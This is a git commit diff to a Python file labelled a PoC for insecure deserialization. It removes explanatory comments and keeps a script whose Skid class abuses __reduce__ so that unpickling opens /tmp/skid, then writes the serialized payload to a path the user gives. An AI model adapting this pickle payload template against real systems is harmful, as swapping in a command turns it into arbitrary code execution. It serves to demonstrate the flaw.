6f968f5d6484c86b664cf53b7bff418577855430
karmanderLOLOL <111273644+karmanderLOLgit@users.noreply.github.com>
2025-03-24 10:50:16 +0000

    Update _pickle.py

--- _pickle.py
+++ _pickle.py
@@ -1,35 +1,19 @@
-```
-#The code provided is vulnerable to a deserialization attack. The `Skid` class implements the `__reduce__()` method, which allows an attacker to execute arbitrary code  
-#during deserialization. In this case, the code opens a file and writes to it, which can be abused to perform unintended actions or execute malicious commands on the #system. 
-#It is important to validate and sanitize input when deserializing untrusted data to prevent such vulnerabilities.
-
+# PoC
+# insecure Deserialization 
+# how is it vulnerable? 
+# The Skid class implements the __reduce__ method, which allows an attacker to execute arbitrary code during deserialization
 import _pickle as skid
 import os 
 
-# Define a custom class for serialization
 class Skid:
   def __reduce__(self):
       filename = '/tmp/skid'
-      return (open, (filename, 'a'), ())  # Returns a tuple with file open operation args and an empty tuple
-
-# Define a list variable
+      return (open, (filename, 'a'), ())  
 variable = ["skid", "skid2", "skid3"]
-
-# Serialize the list variable using _pickle.dumps() and store the result in se_data
 se_data = skid.dumps(list(variable))
-
-# Print the serialized data (in binary format)
 print(se_data)
-
-# Deserialize the serialized data using _pickle.loads() and store the result in de_data
 de_data = skid.loads(se_data)
-
-# Serialize the Skid class instance using _pickle.dumps() and store the result in shellcode
 shellcode = skid.dumps(Skid())
-
-# Prompt user for input to specify the filename or path
 input = input("filename / path?> ")
-
-# Write the shellcode to the specified file (in binary format)
 with open(input, 'wb') as file_object:
   file_object.write(shellcode)```
